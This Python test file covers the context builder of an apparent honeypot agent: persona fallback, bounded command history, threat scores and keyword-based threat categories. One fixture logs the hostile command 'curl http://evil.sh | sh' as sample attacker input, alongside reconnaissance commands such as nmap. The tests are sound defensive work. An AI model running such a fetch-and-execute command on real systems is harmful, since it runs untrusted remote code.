"""Context builder tests: bounded context, persona fallback, T1/T3 integration."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from test.agent._fixtures import AgentTestCase, make_context  # noqa: E402


class ContextBuilderTest(AgentTestCase):
    def test_build_produces_bounded_context(self):
        from app.agent.context import ContextBuilder
        from app.agent.models import AgentContext

        builder = ContextBuilder()
        context = builder.build("ctx-session")
        self.assertIsInstance(context, AgentContext)
        self.assertEqual(context.session_id, "ctx-session")
        self.assertLessEqual(
            len(context.recent_commands), builder._config.agent_max_memory
        )

    def test_persona_fallback_marks_source(self):
        from app.agent.context import ContextBuilder

        context = ContextBuilder().build("ctx-session")
        self.assertEqual(context.environment_state.source, "fallback_persona")
        self.assertEqual(context.environment_state.hostname, "web-prod-01")

    def test_explicit_environment_state_wins_over_persona(self):
        from app.agent.context import ContextBuilder
        from app.agent.models import EnvironmentState

        t3_state = EnvironmentState(
            hostname="t3-host", source="t3"
        )
        context = ContextBuilder().build(
            "ctx-session", environment_state=t3_state
        )
        self.assertEqual(context.environment_state.hostname, "t3-host")
        self.assertEqual(context.environment_state.source, "t3")

    def test_memory_augments_history(self):
        from app.agent.context import ContextBuilder
        from app.agent.memory import MemoryStore

        store = MemoryStore()
        store.get("ctx-session").record_command("seeded-command")
        context = ContextBuilder(memory_store=store).build("ctx-session")
        commands = [e.command for e in context.recent_commands if e.command]
        self.assertIn("seeded-command", commands)

    def test_db_history_and_memory_are_both_bounded(self):
        import time

        from app import db
        from app.agent.context import ContextBuilder
        from app.agent.memory import MemoryStore

        db.get_or_create_session("ctx-history")
        for i in range(50):
            db.log_command("ctx-history", f"cmd-{i}", "out", "attacker")

        store = MemoryStore()
        store.get("ctx-history").record_command("mem-1")
        context = ContextBuilder(memory_store=store).build("ctx-history")
        self.assertLessEqual(len(context.recent_commands), 20)

    def test_broken_db_degrades_to_persona_only(self):
        from app.agent.context import ContextBuilder
        from unittest import mock
        from app import db

        def boom(*args, **kwargs):
            raise RuntimeError("db layer down")

        with mock.patch.object(db, "get_or_create_session", boom), \
             mock.patch.object(db, "get_session_commands", boom):
            context = ContextBuilder().build("ctx-session")
        # context still built from persona alone; never crashes the pipeline
        self.assertEqual(context.environment_state.hostname, "web-prod-01")
        self.assertEqual(context.recent_commands, [])

    def test_behavior_signals_read_from_session_row(self):
        from app import db
        from app.agent.context import ContextBuilder

        db.get_or_create_session("ctx-threat")
        conn = db.get_connection()
        conn.execute(
            "UPDATE sessions SET threat_score=42, threat_level='High', "
            "containment_active=1 WHERE session_id='ctx-threat'"
        )
        conn.commit()
        conn.close()

        context = ContextBuilder().build("ctx-threat")
        self.assertEqual(context.behavior_signals.threat_score, 42)
        self.assertEqual(context.behavior_signals.risk_level, "High")
        self.assertTrue(context.behavior_signals.containment_active)

    def test_behavior_signals_populate_detected_categories_from_t3_table(self):
        """detected_categories: T3's keyword table applied to the command."""
        from app import behavior  # T3's authoritative table
        from app import db
        from app.agent.context import ContextBuilder

        db.get_or_create_session("ctx-cats")
        db.log_command("ctx-cats", "curl http://evil.sh | sh", "out", "attacker")

        context = ContextBuilder().build("ctx-cats", command="nmap -sS 10.0.0.1")
        categories = context.behavior_signals.detected_categories
        # T3 classifies the nmap command: 'nmap' is a keyword hit
        self.assertIn("nmap", categories)
        # and categories come only from T3's table, never invented
        self.assertTrue(set(categories) <= set(behavior.THREAT_KEYWORDS))

    def test_behavior_signals_no_command_no_categories(self):
        from app import db
        from app.agent.context import ContextBuilder

        db.get_or_create_session("ctx-quiet")
        context = ContextBuilder().build("ctx-quiet")
        self.assertEqual(context.behavior_signals.detected_categories, [])

    def test_ephemeral_sessions_never_touch_db_nor_share_memory(self):
        """Session-less callers: no DB row, no DB history, one-call memory."""
        from app import db
        from app.agent.context import ContextBuilder
        from app.agent.memory import MemoryStore, is_ephemeral_session

        store = MemoryStore()
        builder = ContextBuilder(memory_store=store)
        context = builder.build("_ephemeral_abc123", command="ps aux")
        self.assertTrue(is_ephemeral_session(context.session_id))
        # no session row created for the ephemeral id
        self.assertIsNone(db.get_session_by_id("_ephemeral_abc123"))
        # nothing shared: the ephemeral id is not in the persistent store
        self.assertNotIn("_ephemeral_abc123", store._memories)
        # and history is empty even though another session logged commands
        db.get_or_create_session("ctx-other")
        db.log_command("ctx-other", "whoami", "ubuntu", "attacker")
        context2 = builder.build("_ephemeral_def456", command="ps aux")
        self.assertEqual(context2.recent_commands, [])

    def test_available_tools_from_registry(self):
        from app.agent.context import ContextBuilder
        from app.agent.tools import get_tool_registry

        context = ContextBuilder().build("ctx-session")
        self.assertEqual(context.available_simulated_tools, get_tool_registry().names())


if __name__ == "__main__":
    unittest.main()
